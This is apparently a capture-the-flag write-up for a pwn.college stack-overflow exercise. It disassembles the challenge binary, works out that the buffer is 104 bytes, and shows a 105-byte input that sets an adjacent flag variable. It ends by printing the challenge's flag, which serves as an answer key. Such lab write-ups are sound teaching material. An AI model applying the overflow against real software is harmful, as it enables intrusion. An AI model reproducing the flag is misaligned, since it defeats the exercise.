# level1.1
## Description
Overflow a buffer on the stack to set the right conditions to obtain the flag!
## Solution
- Running `./babymem-level-1-1` and giving sample input:
```
###
### Welcome to ./babymem-level-1-1!
###

Payload size: 4
Send your payload (up to 4 bytes)!
AAAA
Goodbye!
### Goodbye!
```
- Running `objdump -d -M intel babymem-level-1-1` and checking out the `challenge` function:
```
000000000000161a <challenge>:
    161a:       f3 0f 1e fa             endbr64
    161e:       55                      push   rbp
    161f:       48 89 e5                mov    rbp,rsp
    1622:       48 81 ec c0 00 00 00    sub    rsp,0xc0
    1629:       89 bd 5c ff ff ff       mov    DWORD PTR [rbp-0xa4],edi
    162f:       48 89 b5 50 ff ff ff    mov    QWORD PTR [rbp-0xb0],rsi
    1636:       48 89 95 48 ff ff ff    mov    QWORD PTR [rbp-0xb8],rdx
    163d:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
    1644:       00 00 
    1646:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
    164a:       31 c0                   xor    eax,eax
    164c:       48 8d 55 80             lea    rdx,[rbp-0x80]
    1650:       b8 00 00 00 00          mov    eax,0x0
    1655:       b9 0d 00 00 00          mov    ecx,0xd
    165a:       48 89 d7                mov    rdi,rdx
    165d:       f3 48 ab                rep stos QWORD PTR es:[rdi],rax
    1660:       48 89 fa                mov    rdx,rdi
    1663:       89 02                   mov    DWORD PTR [rdx],eax
    1665:       48 83 c2 04             add    rdx,0x4
    1669:       48 8d 45 80             lea    rax,[rbp-0x80]
    166d:       48 89 85 70 ff ff ff    mov    QWORD PTR [rbp-0x90],rax
    1674:       48 8d 45 80             lea    rax,[rbp-0x80]
    1678:       48 83 c0 68             add    rax,0x68
    167c:       48 89 85 78 ff ff ff    mov    QWORD PTR [rbp-0x88],rax
    1683:       48 c7 85 68 ff ff ff    mov    QWORD PTR [rbp-0x98],0x0
    168a:       00 00 00 00 
    168e:       48 8d 3d 77 0a 00 00    lea    rdi,[rip+0xa77]        # 210c <_IO_stdin_used+0x10c>
    1695:       b8 00 00 00 00          mov    eax,0x0
    169a:       e8 c1 fa ff ff          call   1160 <printf@plt>
    169f:       48 8d 85 68 ff ff ff    lea    rax,[rbp-0x98]
    16a6:       48 89 c6                mov    rsi,rax
    16a9:       48 8d 3d 6b 0a 00 00    lea    rdi,[rip+0xa6b]        # 211b <_IO_stdin_used+0x11b>
    16b0:       b8 00 00 00 00          mov    eax,0x0
    16b5:       e8 f6 fa ff ff          call   11b0 <__isoc99_scanf@plt>
    16ba:       48 8b 85 68 ff ff ff    mov    rax,QWORD PTR [rbp-0x98]
    16c1:       48 89 c6                mov    rsi,rax
    16c4:       48 8d 3d 55 0a 00 00    lea    rdi,[rip+0xa55]        # 2120 <_IO_stdin_used+0x120>
    16cb:       b8 00 00 00 00          mov    eax,0x0
    16d0:       e8 8b fa ff ff          call   1160 <printf@plt>
    16d5:       48 8b 95 68 ff ff ff    mov    rdx,QWORD PTR [rbp-0x98]
    16dc:       48 8b 85 70 ff ff ff    mov    rax,QWORD PTR [rbp-0x90]
    16e3:       48 89 c6                mov    rsi,rax
    16e6:       bf 00 00 00 00          mov    edi,0x0
    16eb:       e8 90 fa ff ff          call   1180 <read@plt>
    16f0:       89 85 64 ff ff ff       mov    DWORD PTR [rbp-0x9c],eax
    16f6:       83 bd 64 ff ff ff 00    cmp    DWORD PTR [rbp-0x9c],0x0
    16fd:       79 2c                   jns    172b <challenge+0x111>
    16ff:       e8 1c fa ff ff          call   1120 <__errno_location@plt>
    1704:       8b 00                   mov    eax,DWORD PTR [rax]
    1706:       89 c7                   mov    edi,eax
    1708:       e8 c3 fa ff ff          call   11d0 <strerror@plt>
    170d:       48 89 c6                mov    rsi,rax
    1710:       48 8d 3d 31 0a 00 00    lea    rdi,[rip+0xa31]        # 2148 <_IO_stdin_used+0x148>
    1717:       b8 00 00 00 00          mov    eax,0x0
    171c:       e8 3f fa ff ff          call   1160 <printf@plt>
    1721:       bf 01 00 00 00          mov    edi,0x1
    1726:       e8 95 fa ff ff          call   11c0 <exit@plt>
    172b:       48 8b 85 78 ff ff ff    mov    rax,QWORD PTR [rbp-0x88]
    1732:       8b 00                   mov    eax,DWORD PTR [rax]
    1734:       85 c0                   test   eax,eax
    1736:       74 0a                   je     1742 <challenge+0x128>
    1738:       b8 00 00 00 00          mov    eax,0x0
    173d:       e8 d1 fd ff ff          call   1513 <win>
    1742:       48 8d 3d 23 0a 00 00    lea    rdi,[rip+0xa23]        # 216c <_IO_stdin_used+0x16c>
    1749:       e8 e2 f9 ff ff          call   1130 <puts@plt>
    174e:       b8 00 00 00 00          mov    eax,0x0
    1753:       48 8b 4d f8             mov    rcx,QWORD PTR [rbp-0x8]
    1757:       64 48 33 0c 25 28 00    xor    rcx,QWORD PTR fs:0x28
    175e:       00 00 
    1760:       74 05                   je     1767 <challenge+0x14d>
    1762:       e8 e9 f9 ff ff          call   1150 <__stack_chk_fail@plt>
    1767:       c9                      leave
    1768:       c3                      ret
```
- The `challenge` function reads a string from the user and stores it in the stack buffer at `[rbp-0x80]` with a size of `0xd` bytes. We know this from these lines:
```
    164c:       48 8d 55 80             lea    rdx,[rbp-0x80]
    1650:       b8 00 00 00 00          mov    eax,0x0
    1655:       b9 0d 00 00 00          mov    ecx,0xd
    165a:       48 89 d7                mov    rdi,rdx
    165d:       f3 48 ab                rep stos QWORD PTR es:[rdi],rax
```
- The `ecx` register is set to `0xd` (13). `ecx` is used as a counter for the `rep stos` instruction.
- `rep` repeats the `stos` instruction `ecx` times. 
- `stos` stands for "Store String". It stores the value in `rax` in the memory location pointed to by `rdi` and increments the value of `rdi` by the size of the operand.
- `QWORD` is a 64-bit (8 bytes) operand. So, `rep stos QWORD PTR es:[rdi],rax` will store the value in `rax` (which is 0) in the memory locations pointed to by `rdi` for `0xd` times.
- So 13 * 8 = 104 bytes will be initialized with 0 starting from `[rbp-0x80]`. This means that the buffer is 104 bytes long.
- From [level1.0](./level1.0.md), we know that the `win` variable is immediately after the buffer. Since the buffer is 104 bytes long, if we craft our payload to be 105 bytes long, we can overwrite the `win` variable with a non-zero value:
```
./babymem-level-1-1 
###
### Welcome to ./babymem-level-1-1!
###

Payload size: 105
Send your payload (up to 105 bytes)!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You win! Here is your flag:
pwn.college{Mk8McHgG5Rab_29pRkhzlcL5ZFN.0FM5IDL5QTO0czW}


Goodbye!
### Goodbye!
```
- The flag is `pwn.college{Mk8McHgG5Rab_29pRkhzlcL5ZFN.0FM5IDL5QTO0czW}`.